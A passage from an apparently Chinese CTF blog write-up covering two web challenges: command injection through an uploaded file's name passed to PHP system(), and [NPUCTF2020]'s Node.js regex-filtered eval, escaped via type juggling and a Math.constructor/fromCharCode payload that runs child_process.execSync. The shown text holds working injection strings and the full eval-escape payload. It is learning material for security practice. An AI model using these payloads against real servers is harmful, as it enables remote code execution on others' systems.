class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);<br>&#125;<br><span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$picdata</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="hljs-variable">$picdata</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);<br>&#125;<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$allowtype</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>注意这个命令执行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>这里直接命令执行读上传的文件了，比如：</p>
<p><img src="/img/nu1lctfeatingcms3.png" srcset="/img/loading.gif" lazyload alt="nu1lctfeatingcms3"></p>
<p>可以通过修改文件名来<code>RCE</code>，但我不管怎么试结果都是<code>404</code>。。后来才知道真正的文件上传页面是<code>m4aaannngggeee</code>:</p>
<p><img src="/img/nu1lctfeatingcms2.png" srcset="/img/loading.gif" lazyload alt="nu1lctfeatingcms2"></p>
<p><code>system</code>里可以利用<code>;</code>同时执行多个命令，所以<code>cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/</code>用一个<code>;</code>闭合就行(|base64 -w 0会把结果以base64输出)：</p>
<p><img src="/img/nu1lctfeatingcms4.png" srcset="/img/loading.gif" lazyload alt="nu1lctfeatingcms4"></p>
<p>当然也可以利用<code>#</code>把后面注释掉，比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls;cat script.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果：</span><br>run<br>script.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls;cat script.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls;#cat script.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果</span><br>run<br>script.php<br><br></code></pre></td></tr></table></figure>

<p>但注意这里不能用<code>/</code>，会报错(error:can not move)：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>     <br><span class="hljs-comment">//php文件上传时。将缓存文件移动到目标目录由于存在特殊字符。就会报错</span><br></code></pre></td></tr></table></figure>

<p>解决方法很多，比如先<code>cd ..</code>回到上一级再执行<code>ls</code>，或者：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>;`<span class="hljs-built_in">echo</span> Y2F0IC9mbGFnXzIzMzMzMw==|<span class="hljs-built_in">base64</span> -d`<br><br>;`<span class="hljs-built_in">echo</span> Y2F0IC9mbGFnXzIzMzMzMw==|<span class="hljs-built_in">base64</span> -d`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<h4 id="思路总结："><a href="#思路总结：" class="headerlink" title="思路总结："></a>思路总结：</h4><h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p><code>/source</code>:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> cookieSession = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-session&#x27;</span>);<br><br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> keys = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./key.js&#x27;</span>).<span class="hljs-property">keys</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">s</span>) &#123;<br>  <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;md5&#x27;</span>)<br>    .<span class="hljs-title function_">update</span>(s)<br>    .<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">saferEval</span>(<span class="hljs-params">str</span>) &#123;<br>  <span class="hljs-keyword">if</span> (str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(str); <span class="hljs-comment">//注意这个，是否存在绕过？</span><br>&#125; <span class="hljs-comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span><br><br><span class="hljs-keyword">const</span> template = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;./index.html&#x27;</span>).<span class="hljs-title function_">toString</span>();<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">results</span>) &#123;<br>  <span class="hljs-keyword">return</span> template.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>));<br>&#125;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieSession</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;PHPSESSION&#x27;</span>, <span class="hljs-comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span><br>  keys<br>&#125;));<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Object</span>);<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Math</span>);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">let</span> result = <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">const</span> results = req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span> || [];<br>  <span class="hljs-keyword">const</span> &#123; e, first, second &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (first &amp;&amp; second &amp;&amp; first.<span class="hljs-property">length</span> === second.<span class="hljs-property">length</span> &amp;&amp; first!==second &amp;&amp; <span class="hljs-title function_">md5</span>(first+keys[<span class="hljs-number">0</span>]) === <span class="hljs-title function_">md5</span>(second+keys[<span class="hljs-number">0</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">e</span>) &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>        result = <span class="hljs-title function_">saferEval</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">e</span>) || <span class="hljs-string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e);<br>        result = <span class="hljs-string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;<br>      &#125;<br>      results.<span class="hljs-title function_">unshift</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;req.body.e&#125;</span>=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    results.<span class="hljs-title function_">unshift</span>(<span class="hljs-string">&#x27;Not verified!&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (results.<span class="hljs-property">length</span> &gt; <span class="hljs-number">13</span>) &#123;<br>    results.<span class="hljs-title function_">pop</span>();<br>  &#125;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span> = results;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">render</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span>));<br>&#125;);<br><br><span class="hljs-comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/javascript;charset=utf-8&#x27;</span>);<br>  res.<span class="hljs-title function_">send</span>(fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;./index.js&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">admin</span> = req.<span class="hljs-property">session</span>.<span class="hljs-property">admin</span> || <span class="hljs-number">0</span>;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">render</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span> = req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span> || []))<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">80</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Start listening&#x27;</span>)<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>如果想利用<code>saferEval</code>，首先要满足这么个东西：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (first &amp;&amp; second &amp;&amp; first.<span class="hljs-property">length</span> === second.<span class="hljs-property">length</span> &amp;&amp; first!==second &amp;&amp; <span class="hljs-title function_">md5</span>(first+keys[<span class="hljs-number">0</span>]) === <span class="hljs-title function_">md5</span>(second+keys[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure>

<p><code>js</code>这东西和<code>php</code>也存在强等于弱等于之类的问题，具体可以参考<code>susec</code>这道题：</p>
<p><a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/susec-ctf-2020web-0/">参考资料</a></p>
<p>所以令<code>first</code>为<code>&quot;0&quot;</code>,<code>second</code>为<code>[0]</code>即可(注意这里不能直接用数字，因为数字没有<code>length</code>属性)。</p>
<p>我们可以通过<code>JSON</code>格式提交数据，中间件将对其进行解析：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br></code></pre></td></tr></table></figure>

<p>可以<code>POST</code>提交：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;e&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;payload&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;first&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;second&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p><code>payload</code>是<code>saferEval</code>函数的参数，看看<code>saferEval</code>干了啥：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">saferEval</span>(<span class="hljs-params">str</span>) &#123;<br>  <span class="hljs-keyword">if</span> (str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(str); <br>&#125; <br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.z3ratu1.top/[NPUCTF2020]%E9%AA%8C%E8%AF%81%F0%9F%90%8E.html">参考资料</a></p>
<p><code>(?:Math(?:\.\w+)?)</code>：匹配 <code>Math.[0-9a-z]</code></p>
<p><code>[()+\-*/&amp;|^%&lt;&gt;=,?:]</code>：匹配中括号内任意一个字符（<code>\-</code>为减号）</p>
<p><code>(?:\d+\.?\d*(?:e\d+)?)</code>：匹配 数字开头  一个或零个点  一个或零个 e[0-9]</p>
<p><code> </code>：匹配空格</p>
<p>匹配到这些东西会替换成空，如果最终为空的话才能调用<code>eval</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-params">Math</span>=&gt;</span><br>        (<span class="hljs-title class_">Math</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>,<br>                <span class="hljs-title class_">Math</span>.<span class="hljs-property">x</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span><br><span class="hljs-params">                    <span class="hljs-built_in">Math</span>.fromCharCode(<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">117</span>,<span class="hljs-number">114</span>,<span class="hljs-number">110</span>,<span class="hljs-number">32</span>,<span class="hljs-number">112</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,</span><br><span class="hljs-params">                        <span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">46</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">77</span>,<span class="hljs-number">111</span>,<span class="hljs-number">100</span>,<span class="hljs-number">117</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,</span><br><span class="hljs-params">                        <span class="hljs-number">46</span>,<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">113</span>,<span class="hljs-number">117</span>,<span class="hljs-number">105</span>,<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">39</span>,<span class="hljs-number">99</span>,<span class="hljs-number">104</span>,<span class="hljs-number">105</span>,<span class="hljs-number">108</span>,<span class="hljs-number">100</span>,</span><br><span class="hljs-params">                        <span class="hljs-number">95</span>,<span class="hljs-number">112</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">83</span>,</span><br><span class="hljs-params">                        <span class="hljs-number">121</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">40</span>,<span class="hljs-number">39</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">47</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>)</span>)(<span class="hljs-params"></span>)<br>        )<br>)(<span class="hljs-title class_">Math</span>+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p><code>romCharCode</code> 是 JavaScript 中的方法，用于将 Unicode 编码转换为字符，相当于：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-params">Math</span>=&gt;</span><br>        (<span class="hljs-title class_">Math</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>,<br>                <span class="hljs-title class_">Math</span>.<span class="hljs-property">x</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()&quot;</span></span>)(<span class="hljs-params"></span>)<br>        )<br>)(<span class="hljs-title class_">Math</span>+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p>先是这部分：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Math</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>,<br>	<span class="hljs-title class_">Math</span>.<span class="hljs-property">x</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span><br></code></pre></td></tr></table></figure>

<p>node:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&gt; <span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Object</span>]<br>&gt; <span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>.<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Function</span>]<br></code></pre></td></tr></table></figure>

<p>返回了一个<code>Function</code>，<code>js</code>中每个函数实际上都是一个<code>Function</code> 对象。它可以动态的创建一个函数：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">&gt; (<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;&#125;).<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Function</span>]<br>&gt; add = <span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-keyword">return</span> a + b<span class="hljs-string">&#x27;)</span></span><br><span class="hljs-string"><span class="hljs-params">add = Math.constructor.constructor(&#x27;</span>a<span class="hljs-string">&#x27;,&#x27;</span>b<span class="hljs-string">&#x27;,return a + b&#x27;</span></span>)<br>                                           ^^^^^^<br><br><span class="hljs-title class_">Uncaught</span> <span class="hljs-title class_">SyntaxError</span>: <span class="hljs-title class_">Unexpected</span> token <span class="hljs-string">&#x27;return&#x27;</span><br>&gt; add = <span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;return a + b&#x27;</span></span>)<br>[<span class="hljs-title class_">Function</span>: anonymous]<br>&gt; <span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-number">3</span><br>&gt; sum = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;return a + b &#x27;</span>)<br>[<span class="hljs-title class_">Function</span>: anonymous]<br>&gt; <span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>

<p>要执行的命令是：注意最后面加了个<code>()</code>表示立刻执行(自调用函数)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()&quot;</span>)()<br></code></pre></td></tr></table></figure>

<p>再把第一行加上，发现这东西就是个箭头函数自调用：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-params">Math</span>=&gt;</span><br>        (<span class="hljs-title class_">Math</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>,<br>                <span class="hljs-title class_">Math</span>.<span class="hljs-property">x</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()&quot;</span></span>)(<span class="hljs-params"></span>)<br>        )<br>)(<span class="hljs-title class_">Math</span>+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/img/npuctf2020yzm1.png" srcset="/img/loading.gif" lazyload alt="npuctf2020yzm1"></p>
<p>最后的<code>(Math+1)</code>这个参数其实是为了获取<code>String</code>对象，因为<code>fromCharCode</code>方法是个字符串方法，所以前面的<code>Math.constructor</code>啥的好像没有演示的必要？</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&gt; <span class="hljs-title class_">String</span>.<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Function</span>]<br>&gt; <span class="hljs-title class_">String</span>.<span class="hljs-property">constructor</span>.<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Function</span>]<br></code></pre></td></tr></table></figure>

